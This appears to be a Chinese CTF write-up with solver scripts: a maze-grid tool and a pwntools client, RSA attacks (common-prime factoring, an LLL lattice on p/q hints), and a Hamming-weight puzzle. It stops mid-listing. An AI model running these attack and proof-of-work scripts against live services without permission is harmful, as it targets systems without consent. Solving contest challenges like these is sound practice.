写了个描点工具：

```python
import sys
import time

from PyQt5.QtWidgets import QApplication, QMainWindow, QGridLayout, QPushButton, QWidget, QLabel
from PyQt5.QtGui import QColor
from PyQt5.QtCore import Qt, QCoreApplication
from rpyc import timed

from strategy import stick2LeftWall

class GridCell(QLabel):
    def __init__(self):
        super().__init__()
        self.setFixedSize(10, 10)  # 每个格子的大小
        self.setStyleSheet("background-color: white;")
        self.color = QColor(255, 255, 255)  # 初始为白色

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self.toggle_color()

    def toggle_color(self):

        if self.color == QColor(255, 255, 255):  # 如果是白色，变成黑色
            self.color = QColor(0, 0, 0)
            self.setStyleSheet("background-color: black;")
        else:  # 否则变成白色
            self.color = QColor(255, 255, 255)
            self.setStyleSheet("background-color: white;")

class GridWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("49x49 Pixel Grid")
        self.setGeometry(100, 100, 510, 550)  # 调整窗口大小

        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)

        self.grid_layout = QGridLayout()
        self.grid_layout.setSpacing(1)  # 设置格子之间的间隔为0
        self.cells = []

        # 创建49x49的格子
        for row in range(49):
            cell_row = []
            for col in range(49):
                cell = GridCell()
                cell_row.append(cell)
                self.grid_layout.addWidget(cell, row, col)
            self.cells.append(cell_row)

        # 添加行和列的标号
        for i in range(49):
            row_label = QLabel(str(i ))
            row_label.setStyleSheet("font-size: 8px;")  # 设置行号字体大小
            self.grid_layout.addWidget(row_label, i, 49)  # 列号

            col_label = QLabel(str(i ))
            col_label.setStyleSheet("font-size: 8px;")  # 设置列号字体大小
            self.grid_layout.addWidget(col_label, 49, i)  # 行号

        self.button = QPushButton("输出颜色信息")
        self.button.clicked.connect(self.output_grid)
        self.grid_layout.addWidget(self.button, 50, 0, 1, 50)

        self.central_widget.setLayout(self.grid_layout)
        try:
            with open("in.txt", "r") as f:
                maze = f.read().split("\n")
                # print(maze)
                for i in range(49):
                    for j in range(49):
                        if maze[i][j] == '1':
                            self.cells[i][j].toggle_color()
        except Exception:
            pass

    def clear(self):
        for i in range(49):
            for j in range(49):
                if self.cells[i][j].color == QColor(0, 255, 0) or self.cells[i][j].color == QColor(255, 0, 0):
                    self.cells[i][j].color = QColor(255, 255, 255)
                    self.cells[i][j].setStyleSheet("background-color: white;")
    def search(self): # challenge 4
        self.clear()
        start=(24,24)
        point=start
        last_point=start
        direction='down'
        for c in range(1700):
            QCoreApplication.processEvents()
            time.sleep(0.01)
            ppoint=point

            self.cells[point[1]][point[0]].color = QColor(255, 0, 0)
            self.cells[point[1]][point[0]].setStyleSheet("background-color: red;")
            self.cells[last_point[1]][last_point[0]].color = QColor(0, 255, 0)
            self.cells[last_point[1]][last_point[0]].setStyleSheet(f"background-color: #00FF{hex(int(c/1700*254))[2:].zfill(2)};")
            
            last_point = point
            if direction == 'down':
                point=(point[0],point[1]+1)
            elif direction == 'up':
                point=(point[0],point[1]-1)
            elif direction == 'right':
                point=(point[0]+1,point[1])
            elif direction == 'left':
                point=(point[0]-1,point[1])
            if self.cells[point[1]][point[0]].color==QColor(0, 0, 0) or (point[0]>=48 or point[0]<=0 or point[1]>=48 or point[1]<=0):
                print(f'map[{point[1]}][{point[0]}]=\'1\'')
                if direction == 'down':
                    direction='left'
                elif direction == 'up':
                    direction='right'
                elif direction == 'right':
                    direction='down'
                elif direction == 'left':
                    direction='up'
                point=ppoint

    def output_grid(self):

        self.clear()
        self.search() # challenge 4
        output = []
        calc = []
        for row in self.cells:
            row_output = []
            calc_output = []
            for cell in row:
                row_output.append('1' if cell.color == QColor(0, 0, 0) else '0')
                calc_output.append(1 if cell.color == QColor(0, 0, 0) else 0)
            output.append("".join(row_output))
            calc.append(calc_output)

        print(calc)
        print("\n".join(output))  # 打印输出结果
        with open("in.txt", "w") as f:
            f.write("\n".join(output))  # 将结果保存到文件

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = GridWindow()
    window.show()
    sys.exit(app.exec_())
```

1. challenge1

空的就能过

2. challenge2

机器人寻路策略是优先下右上左，并且保证让 p1 和 p2 的路径长相同。如图即可。

通过堵住如 `(2,2)` 位置每一个向下再返回路径的返回位置让程序认为该路径为 badpath

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_50.png)

3. challenge3

优先向下。如图即可。

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_51.png)

4. challenge4

p1 寻路策略是左拐，p2 寻路策略是右拐，用工具点一点找到够长的路线，给 p1 留一段就可以。

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_52.png)

5. challenge5

策略是贴墙走，构造如下黑色墙可以铺满整个屏幕

以 0-3 行为例，可以让返回的色块与来向色块完全重合

![img](https://or4nge-images.zeroc0077.cn/writeups/2024/qwbs8/img_53.png)

```python
import base64
import hashlib
import itertools
from pwn import *
#context.log_level = 'debug'

def show(l):
    res=''
    for i in l:
        res+=(''.join(map(str,i))+'\n')
    print(res)
    return res.strip()

def warp(l:list[list[int]]):
    res=[[1]*49]
    for i in l:

        res.append([1]+i+[1])
    res.append([1]*49)
    print(res)
    return res

def c2():
    empty=warp([[0]*47]*47)
    for i in range(1,48):
        for j in range(3,47,3):
            empty[i][j]=1
    for i in range(3,47,3):
        empty[1][i]=0
    for i in range(2,47,3):
        empty[2][i]=1
    return show(empty)

def c3():
    empty=warp([[0]*47]*47)
    for i in range(1,48):
        for j in range(3,47,3):
            empty[i][j]=1
    for i in range(3,47,3):
        empty[1][i]=0
    for i in range(2,47,4):
        empty[i][46]=1
    for i in range(4,47,4):
        empty[i][47]=1
    return show(empty)

def c4():
    data='''1111111111111111111111111111111111111111111111111
1000000000000000000001000000000000000000000000001
1010000100000000000000000000000000000000000000001
1000001000000000000000000000000000000000000001001
1000100000000000000000000000000000000000000000001
1000000000000000000000000000000000000000000000101
1000001000000000000000000000000000000000000000001
1000000100000010000000000000001000000000000001001
1000000100000000000000000000010000000000000100101
1000000000000000000000000000000000000000000000101
1000000000010000000000000000000000000000000000001
1000000000100000000000000000000000000000100000001
1000000001000000000000000000000000000010000000001
1000000000000100000000000000000000000000000000001
1000000000000000000000000000000000000000010000001
1000000000000001000000000000000100000000010000001
1000000000000000000000000001000000100000000000001
1000000000000000000000001000000000010000000000001
1000000000000000000000000000000000001000000000001
1000000000000000001000000000000000000000000000001
1000000000000000010000000000000000000000000000001
1000000000000000000000000000000000000000000000001
1000000000000000000000010000000000000000000000001
1000000010000000000000000010000000000000000000001
1000000000000000000000000000000000000000100000001
1000000000000000100000000000010000000000000000001
1000000000000000000000000000010000000000000001001
1000000000000000010000000000000000000000010000101
1000000001000000000000000000000000000000000000001
1000000000000000000000000000000000000000001000001
1000000000101000000000000000000000000000000000001
1000000000000000000100000001101000000000000000001
1000000000000000000000000000000010100000000000001
1000000000000100000000000000000000000000000100001
1000000010000000000000000000000000000001000000001
1000000000000010000000000000000000000100000000001
1000000000000000000000000000100001000000000000001
1000000001000000000000000000000000000000000000001
1000000000100000000000000010001001000000010000001
1000000000000000001000000000000000000000100000101
1000001000000000000000000000000000000000000000001
1000000000000000000000000000000000000000000010001
1000000000000000000000000000000000000000000000001
1000000000000000000000000010100000001100000000011
1000000000000000000000000000000110000000000000001
1001001000000000000001000010000000001000000000001
1000010000000100011000000100000000010000101001101
1100000000000000000000100000000000000000000000001
1111111111111111111111111111111111111111111111111'''
    return data
def c5():
    data='''1111111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1010101010101010101010101010101010101010101010101
1000000000000000000000000000000000000000000000001
1011111111111111111111111111111111111111111111111
1000000000000000000000000000000000000000000000001
1111111111111111111111111111111111111111111111111'''
    return data


def c1():
    return show(warp([[0]*47]*47))

def getcollide(n,d):
    charset=string.ascii_letters+string.digits
    print(d)
    for i in itertools.permutations(charset,4):
        s=n.decode()+''.join(i)
        #print(f'\r{s}')
        ans=hashlib.sha256(s.encode()).hexdigest()
        if ans==d.decode():
            return ''.join(i)

if __name__ == '__main__':

    target='x.x.x.x'
    port = xxxx
    token="xxx"
    p = remote(target, port)
    p.recvuntil(b'nonce1 = \'')
    nonce=p.recvline()[:-3]
    p.recvuntil(b'hexdigest() = \'')
    dig=p.recvline()[:-3]
    ans=getcollide(nonce,dig)
    p.sendlineafter(b'> ',ans)
    p.sendlineafter(b'> ',token.encode())
    p.sendlineafter(b'> ',base64.b64encode(c2().encode()))
    p.sendlineafter(b'> ', base64.b64encode(c2().encode()))
    p.sendlineafter(b'> ', base64.b64encode(c3().encode()))
    p.sendlineafter(b'> ', base64.b64encode(c4().encode()))
    p.sendlineafter(b'> ', base64.b64encode(c5().encode()))
    p.interactive()
```

## Crypto

### EasyRSA

参考 https://hasegawaazusa.github.io/common-prime-rsa.html#%E5%B7%B2%E7%9F%A5-g

选取 $g<a+b$ 的形式，由于 $c$ 的范围可能并没落在 $N^{0.5-2*gamma}$ 跑一次可能出不来，就选择多跑几次：

```python
from sage.groups.generic import bsgs
from pwn import *
from Crypto.Util.number import *

while(1):
    p = remote("47.94.231.2" ,"37062")
    N = p.recvline()
    e = p.recvline()
    g = p.recvline()
    enc = p.recvline()
    N = int(N[2:])
    e = int(e[2:])
    g = int(g[2:])
    enc = int(enc[4:])
    print(N)
    print(e)
    print(g)
    print(enc)
    nbits = N.bit_length()
    print(nbits)
    gamma = g.bit_length()/nbits
    print(gamma)
    cbits = ceil(nbits * (0.5 - 2 * gamma))
    M = (N - 1) // (2 * g)
    u = M // (2 * g)
    v = M - 2 * g * u
    GF = Zmod(N)
    x = GF.random_element()
    y = x ^ (2 * g)
    try:
        c = bsgs(y, y ^ u, (2**(cbits-1), 2**(cbits+1)))
        ab = u - c
        apb = v + 2 * g * c
        P.<x> = ZZ[]
        f = x ^ 2 - apb * x + ab
        a = f.roots()
        if a:
            a, b = a[0][0], a[1][0]
            p = 2 * g * a + 1
            q = 2 * g * b + 1
            assert p * q == N
            print(N,e,g,enc)
            print(a,b)
            phi = (p-1)*(q-1)
            d = inverse(e, phi)
            m = pow(enc, d, N)
            print(long_to_bytes(m))
            break
    except:
        print('fuck')
        continue
```

### apbq

stage1 泄露 $p+q$ 的信息，通过计算 $n-hints1+1$ 得到 $\phi(n)$，从而可以得到私钥

```python
#stage 1: p + q
hints = 18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170
n,e = (89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589, 65537)
enc1 = 23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247

phi = n - hints +1
d= gmpy2.invert(e,phi)
print(long_to_bytes(pow(enc1,d,n)))
```

stage2 泄露 $ap+bq$ 的信息，参考 https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/crypto/apbq-rsa-ii/solve/solv.sage

```python
# stage 2: ai*p + bi*q
hints = [18167664006612887319059224902765270796893002676833140278828762753019422055112981842474960489363321381703961075777458001649580900014422118323835566872616431879801196022002065870575408411392402196289546586784096, 16949724497872153018185454805056817009306460834363366674503445555601166063612534131218872220623085757598803471712484993846679917940676468400619280027766392891909311628455506176580754986432394780968152799110962, 17047826385266266053284093678595321710571075374778544212380847321745757838236659172906205102740667602435787521984776486971187349204170431714654733175622835939702945991530565925393793706654282009524471957119991, 25276634064427324410040718861523090738559926416024529567298785602258493027431468948039474136925591721164931318119534505838854361600391921633689344957912535216611716210525197658061038020595741600369400188538567, 22620929075309280405649238349357640303875210864208854217420509497788451366132889431240039164552611575528102978024292550959541449720371571757925105918051653777519219003404406299551822163574899163183356787743543, 20448555271367430173134759139565874060609709363893002188062221232670423900235907879442989619050874172750997684986786991784813276571714171675161047891339083833557999542955021257408958367084435326315450518847393, 16581432595661532600201978812720360650490725084571756108685801024225869509874266586101665454995626158761371202939602347462284734479523136008114543823450831433459621095011515966186441038409512845483898182330730, 23279853842002415904374433039119754653403309015190065311714877060259027498282160545851169991611095505190810819508498176947439317796919177899445232931519714386295909988604042659419915482267542524373950892662544, 16542280976863346138933938786694562410542429842169310231909671810291444369775133082891329676227328401108505520149711555594236523078258701726652736438397249153484528439336008442771240980575141952222517324476607, 17054798687400834881313828738161453727952686763495185341649729764826734928113560289710721893874591843482763545781022050238655346441049269145400183941816006501187555169759754496609909352066732267489240733143973, 22115728663051324710538517987151446287208882441569930705944807337542411196476967586630373946539021184108542887796299661200933395031919501574357288914028686562763621166172668808524981253976089963176915686295217, 19324745002425971121820837859939938858204545496254632010818159347041222757835937867307372949986924646040179923481350854019113237172710522847771842257888083088958980783122775860443475680302294211764812636993025, 17269103712436870749511150569030640471982622900104490728908671745662264368118790999669887094371008536628103283985205839448583011077421205589315164079023370873380480423797655480624151812894997816254147210406492, 17365467616785968410717969747207581822018195905573214322728668902230086291926193228235744513285718494565736538060677324971757810325341657627830082292794517994668597521842723473167615388674219621483061095351780, 20823988964903136690545608569993429386847299285019716840662662829134516039366335014168034963190410379384987535117127797097185441870894097973310130525700344822429616024795354496158261293140438037100429185280939, 19068742071797863698141529586788871165176403351706021832743114499444358327620104563127248492878047796963678668578417711317317649158855864613197342671267006688211460724339403654215571839421451060657330746917459, 20089639597210347757891251257684515181178224404350699015820324544431016085980542703447257134320668961280907495580251880177990935443438799776252979843969984270461013888122703933975001704404129130156833542263882, 22344734326131457204500487243249860924828673944521980798994250859372628295695660076289343998351448667548250129358262592043131205967592613289260998148991388190917863322690137458448696392344738292233285437662495, 22688858027824961235755458925538246922604928658660170686458395195714455094516952026243659139809095639584746977271909644938258445835519951859659822660413616465736923822988993362023001205350387354001389518742538, 21286046487289796335501643195437352334100195831127922478044197411293510360710188581314023052580692810484251118253550837525637065385439859631494533102244585493243972819369812352385425700028640641292410326514111, 21542729548465815605357067072323013570796657575603676418485975214641398139843537820643982914302122976789859817102498484496409546012119998359943274203338400776158986205776474024356567247508744784200354385060666, 22319592382753357951626314613193901130171847776829835028715915533809475362288873045184870972146269975570664009921662023590318988850871708674240304838922536028975978222603171333743353770676344328056539379240160, 25195209191944761648246874631038407055240893204894145709996399690807569652160721616011712739214434932639646688187304865397816188999592774874989401871300784534538762135830014255425391132306536883804201055992313, 18257804244956449160916107602212089869395886846990320452133193087611626919926796845263727422042179229606817439442521540784268169177331707314788427670112999551683927934427716554137597798283300120796277229509678, 20293403064916574136692432190836928681820834973375054705153628740577159076332283715581047503287766236543327123639746352358718218140738999496451259789097826888955418315455420948960832865750253988992454128969953, 15967654820584966012628708475666706277218484919923639492431538068059543232562431059752700377242326527417238151501168940191488179144049286512652111172149113549072003881460743035279388672984805823560897688895124, 25144187979876039024245879200325843092774389926620026124061775431569974232758799200333888039013494603721065709195353330350750055309315207499741437181094874894647736904055829877859906318073991986020178158776286, 15736932921640444103019961538951409924080453868073105830403926861058056351553271238438325117113945341892868641345117717666354739204401152657265824568724844930574396801692131746182948347887298330990039956813130, 18831072673439732764722762485733622234889447953507582396819704359771208236721692820362137219509611319088756045211407777880521726782697895768017460064889670066178710804124631128581556314122255564861269062385337, 23800437561684813552661749774840752013501533683948618798811470214669024646396165487093720960221009038817909066075238937189371227098032581450466402462014437421254375846263830927945343485988463525070074913720710, 24402191070622494792723290726249952159888270689258801831518209605331984684494095167423722682814769395395011136124403802097229547003802312444913008194461779426175966774202219703164060353710247619639616444797670, 20215481513831963554421686543560596857659844027486522940060791775984622049024173363533378455076109165728144576719015392033536498353094895564917644840994662704362121549525329105205514332808950206092190939931448, 18384453917605955747212560280232547481041600196031285084598132475801990710125754705645482436436531608696373462641765399622296314590071558616193035939108523357020287896879479452040171765916716377102454266933226, 21890401344164908103930010123434944359446535642544335610455613014563290097498740447164765588532234051104173227090428486681237432196639010849051113283297943367655458678533223039415083212229970648958070799280218, 18379893441293694747570620009241814202936873442370354246029979042247705730610190888710981918183390028386451290137755339890329474403224043675724851314770861939082447728194632548864823398818221526652331319263027, 18715827130228986951360013590464775001019026913384718876134449689773600060962392738619405370033085704046027397895627933844824630723286144367800484157574548819065406118338665931032779491897783504790669824301288, 13588739911708699123450670852772302012518315143187739886523841133752009403411431627334135210166268158490674049617489193734568451811305631563767138879895461211915128972052001136464325219117009268526575020143259, 18506039912943821193373920483847347155611306173368341979655092778147169768984477236224526786441466933360500418090210912574990962709452725122792963919616633389125605160796446674502416801964271004625701238202575, 22167985517547342184812919437069844889650448522260359154086923601900060998572245598167213217022051141570075284051615276464952346620430587694188548679895095556459804921016744713098882496174497693878187665372865, 21507363933875318987283059841465034113263466805329282129011688531718330888226928182985538861888698160675575993935166249701145994333840516459683763957425287811252135418288516497258724668090570720893589001392220, 20250321586608105267884665929443511322540360475552916143405651419034772061789298150974629817817611591100450468070842373341756704300393352252725859102426665187194754280129749402796746118608937061141768301995522, 16104259151024766025645778755951638093681273234415510444173981198301666343334808614748361662637508091511498829253677167171091582942780017355912433497214576425697459483727777273045993446283721290714044600814203, 14560242181138184594433372530956542527312169507277535425067427080573272033961044062335960097446781943943464713852520415535775461964590009720592053626735276833191667395201287169782350381649400286337671320581068, 16239347596615402699390026749150381714807445218767496868569282767673828662340774349530405347667558555781433774705139593469838946201218537641296949822639509296966092138954685186059819628696340121356660166937131, 21344472317634795288252811327141546596291633424850284492351783921599290478005814133560171828086405152298309169077585647189366292823613547973428250604674234857289341613448177246451956695700417432794886277704716, 16053809990112020217624905718566971288375815646771826941011489252522755953750669513046736360397030033178139614200701025268874379439106827823605937814395162011464610496629969260310816473733828751702925621950679, 18917855883623050190154989683327838135081813638430345099892537186954876489710857473326920009412778140451855952622686635694323466827034373114657023892484639238914593012175120540210780102536003758794571846502397, 22690171278715056779052233972642657173540399024770527983659216197108042021644328773010698851143953503599329885607621773816718008861742027388432534850163666629476315340137626681994316866368449548292328156728206, 21087818524872480052313215092436868441694786060866149491087132591272640372512484925209820065536439188250579925233059144898601140234767300574307770064543499923712729705795392684173268461519802573563186764326797, 18439753470094841291394543396785250736332596497190578058698960152415339036714664835925822942784700917586270640813663002161425694392259981974491535370706560550540525510875465091384383255081297963169390777475352, 20105719699015744146039374208926740159952318391171137544887868739518535254000803811729763681262304539724253518465850883904308979964535242371235415049403280585133993732946919550180260852767289669076362115454200, 17251599484976651171587511011045311555402088003441531674726612079301412643514474016351608797610153172169183504289799345382527665445027976807805594288914226822374523878290416047130731166794970645275146679838899, 23027331991437585896233907022469624030630702237261170259290872847355304456043379238362120518409085840638396736666056992747627271193089116095167049248270541979716594671069985183070290375121270398623215587207529, 18158149685496169798299129683009221264185608469410295069411669832919646968324946121757411511373498747604679198739125835462814352243797919744572086307939585501566092705355693015625009717017077302201663788208609, 18276153196656501517216055049560959047263892309902154534799806637704337317207294332426798932144785240877892837491213916540255237702169595754963908689566362060228840286531616263506272071630209104758589482803348, 19830654702835464289082520892939657653574451119898587213320188332842291005863699764597454403874285715252681820027919359194554863299385911740908952649966617784376852963552276558475217168696695867402522508290055, 15349828226638644963106414986240676364822261975534684137183044733508521003843559094515387144949811552173241406076270015291925943459603622043168219534080772937297911323165839870364550841685270125556125756627553, 20923687596111161976478930953796496927811701530608223491138786355445002217973253897724452954815797952200740069102515860924306246841340715110620719064010080520601890251137419840158983682372232110885549732743013, 21095748006022412831703352650023882351218414866517568822818298949510471554885207645049385966827210564667371665855668707424105040599599901165292360321667007968065708796593851653085339928947755081203265281357013, 20136320433636422315432754195821125224777716034031656342233368000257459497472596860252592531939146543685406198978058242599116859263546329669263543660114747385041549283367183026001454445297981439938401547228229, 16496919752274418275948572022974868132658743151124597724312835413857298109100258912203517423633396955060591787380445877361136405137884456764770035346437177846666365911942996404514058688909577420388537479730705, 13788728438272498164727737074811797093818033799836159894472736480763530670013682288670889124484670336660448907074673625466218166413315342420667608074179975422284472184048790475129281850298519112884101776426380, 24852871485448795332267345793743281093931161235481251209948049584749441451621572752080662697610253315331335180611651946374137068256112152253681972406000252076016099200912670370417045090034045383991812756120791, 18663346319122078996775762643035864683521213720864038756854558668694021987970601131985163948257100423991091156649638455828855082098689641225427227191064496066436196910238564311309556938903101074363279783438714, 21400068681031931459396470039651524575262457489792894764406364952394476440804779651233022862527636114968325782197380721095406628084183336358459476006267416033892771932528688312375109463803215034905281657962293, 16044158155847172030103761204572942507195578382208455423846603003318483484698088948486132040995746837257705704187725306831142305215342467016564452582165866039427184607605673304595194959499145031211096109534167, 16518253246325822837502418827700493807621067058438396395472266350036385535241769917459657069911028720968654253735107131282350340465691670072304718987805883113410923109703284511709226857412404454224134480632696, 22032469066601123287586507039704080058983969235246539501189720236880312024198451198788699002335010120658564926677243708367430773661097221076615953342733896063909953602379936312639192315223258556134958059637605, 17474611942177808070315948910226643697957069578572244709354155010512694059987765040746148981545760660371360975936526076852619987733316042847813177383519241505024635332293992920023420060610648140841369822739716, 20097265939024591617239874622716452182434300498447992668997438018575636772416262543204370899462096267444545094719202447520254303983442269757551626971917981420832391886214473318353984504467919530676605744560570, 18170251482705061226968041449812078923477452841162650888922564215790088545936753453513162197661916172215859504545409274440450807677845894292177296835154674774694992388033874349807244020099167681146357128785394, 18084007437523118129421476751918491055914528331902780911288404344016551650138679157754567938593688369062981279371320169939281882307797009116458871503759873023914718337944953764426183937635379280572434676575757, 17001811604221128900675671565539617923973183364469396458234914432162200119518252971721448274846235879320362924206656971472493711107677598961463553324277826426691784458674010708635756004550789902368338633272118, 20217009574515126619724139485885721324936960849401637840860565569588595992087537454744066905387396266844236387315004915383456736142307523960394594650088663019228826091309049211780607761862663242437656610298243, 25534440916970201550118006203706860249111087748000550226680885431006136131742280963090650607632467666558508520152535105122661615376298673454198064361094319699307084117001019115669670029195171047304283891069792, 18871869316294018605789169171879572816494092699556970507058691345095743053290043643010965660058888064972257990750611470141816041727746767146945121588515830427165739580791663951175220638901672353681640741068573, 20173968537913641339915058056878181363456579537994317562789857397928196160113042659777558550242315788417022891612723148843142958668959046890197219991727894451795438138592005695329607326086644956073759609743066, 20601943394990265144021144365970164017319737300436518536503270346147112565303361487668388700369636611354280332841812324530501569200031186584749278453651172121161814207025650519637781007286435981682228528706305, 16397528630087028144645213166977866073543422560337716097539091258081008408890966764995645782823950721804205427713461441138000880478364026137452291234097219085473748076681729365744710225699866258812642458184750, 21373350333568141000876969785296802670776508778278005158047105058430550665787088265486222905402690421155861103648370249249790560185790723042867282734693553039477436055775198037042047438047898227097749354619822, 17767469767416052322357795736899648760868316512079849340028040817353808899589201201338152114229279980849491049574543361275046276135253417685681262008211582060955974064559129311524323185960856955462761555353091, 22148352529815091269441663541923247974004854058764556809596705832663604786920964849725772666340437231503146814919702525852955831173047034475925578238466977606367380212886384487294569287202762127531620290162734, 21663842528026621741414050256553652815372885707031383713657826718944735177083300302064509342116651731671570591336596953911570477161536730982887182434407761036442993588590230296643001682944654490645815177777455, 20219077358929317461660881724990436334639078047412693497584358963241840513748365548465302817975329987854784305275832045889690022909383530837382543579292451297269623663257098458645056099201050578472103957851128, 18255302182526662903763852563401346841065939531070045000414364747445988455597258924280193695407035356029557886165605853810182770534711966292253269625917149411889979307227493949293798772727125069093642134972336, 24926064145128749429079117171467042019887257504329103038171762786986349157515552927216574990423327013202735544601170247730647598931030432792167867343343213411600516855009788294067588153504026267213013591793027, 22369607314724468760253123915374991621544992437057652340350735935680183705467064876346663859696919167243522648029531700630202188671406298533187087292461774927340821192866797400987231509211718089237481902671100, 16994227117141934754898145294760231694287000959561775153135582047697469327393472840046006353260694322888486978811557952926229613247229990658445756595259401269267528233642142950389040647504583683489067768144570, 21758885458682118428357134100118546351270408335845311063139309657532131159530485845186953650675925931634290182806173575543561250369768935902929861898597396621656214490429009706989779345367262758413050071213624, 20156282616031755826700336845313823798147854495428660743884481573484471099887576514309769978525225369254700468742981099548840277532978306665910844928986235042420698332201264764734685502001234369189521332392642, 23291765247744127414491614915358658114280269483384022733002965612273627987872443453777028006606037159079637857473229879140366385523633075816362547967658930666106914269093225208138749470566410361196451552322613, 19807792217079652175713365065361659318870738952921195173619551645956745050506271953949139230097128034416815169649874760890189515620232505703162831090225715453502422905418824316957257395992121750661389503495033, 22074209373194902539215367382758486068533032275912313703269990627206774967653336496619231924013216321042649461711292555464574124714934511202231319963361912937842068483700298097209400217869036338644607607557860, 19678336511265998427322297909733474384702243426420286924671444552444079816707773485084891630780465895504253899943221044355971296122774264925882685351095921532685536165514189427245840338009573352081361238596378, 24746314790210393213546150322117518542380438001687269872679602687597595933350510598742749840102841364627647151669428936678130556027300886850086220074563664367409218038338623691372433831784916816798993162471163, 19346137206512895254202370018555139713690272833895195472766704715282164091959131850520571672509601848193468792313437642997923790118115476212663296111963644011010744006086847599108492279986468255445160241848708, 22739514514055088545643169404630736699361136323546717268615404574809011342622362833245601099992039789664042350284789853188040159950619203242924511038681127008964592137006103547262538912024671048254652547084347, 21491512279698208400974501713300096639215882495977078132548631606796810881149011161903684894826752520167909538856354238104288201344211604223297924253960199754326239113862002469224042442018978623149685130901455, 19381008151938129775129563507607725859173925946797075261437001349051037306091047611533900186593946739906685481456985573476863123716331923469386565432105662324849798182175616351721533048174745501978394238803081, 19965143096260141101824772370858657624912960190922708879345774507598595008331705725441057080530773097285721556537121282837594544143441953208783728710383586054502176671726097169651121269564738513585870857829805]
n,e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)
enc2 = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244

V = hints
k = 2 ** 844
M = Matrix.column([k * v for v in V]).augment(Matrix.identity(len(V)))
B = [b[1:] for b in M.LLL()]
M = (k * Matrix(B[:len(V)-2])).T.augment(Matrix.identity(len(V)))
B = [b[-len(V):] for b in M.LLL() if set(b[:len(V)-2]) == {0}]

for s, t in itertools.product(range(101), repeat=2):
    T = s*B[0] + t*B[1]
    a1, a2, a3 = T[0], T[1], T[2]
    kq = gcd(a1 * hints[1] - a2 * hints[0], n)
    if 1 < kq < n:
        print('find!', kq, s, t)
        break

for i in range(2**16, 1, -1):
    if kq % i == 0:
        kq //= i

q = int(kq)
p = int(n // kq)
d = pow(0x10001, -1, (p - 1) * (q - 1))
m = pow(enc2, d, n)
flag = long_to_bytes(m).decode()
print(flag)
```

stage3 使用的 stage2 的私钥，直接拿过来继续解密即可

```python
c = 17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755
n=73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819
print(long_to_bytes(pow(c,d,n)))
# flag{yOu_can_s0lve_the_@pbq_prob1em!!}
```

### 21_steps

题目要求在限定21个算子内计算汉明重量

考虑多次询问GPT后稍加更改可得到以下算法

```python
def hamming_weight_128(n):
    n = n - ((n >> 1) & 0x5555555555555555555555555555555555555555555555555555555555555555)
    n = (n & 0x3333333333333333333333333333333333333333333333333333333333333333) + ((n >> 2) & 0x3333333333333333333333333333333333333333333333333333333333333333)
    n = (n + (n >> 4)) & 0x0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F
    n = n + (n >> 8)
    n = n + (n >> 16)
    n = n + (n >> 32)
    n = n + (n >> 64)
    return n & 0x7F
```

将其翻译为符合题目要求的形式

```plaintext
B = A >> 1;
B = B & 38597363079105398474523661669562635951089994888546854679819194669304376546645;
A = A - B;
B = A & 23158417847463239084714197001737581570653996933128112807891516801582625927987;
A = A >> 2;
A = A & 23158417847463239084714197001737581570653996933128112807891516801582625927987;
A = A + B;
B = A >> 4;
A = A + B;
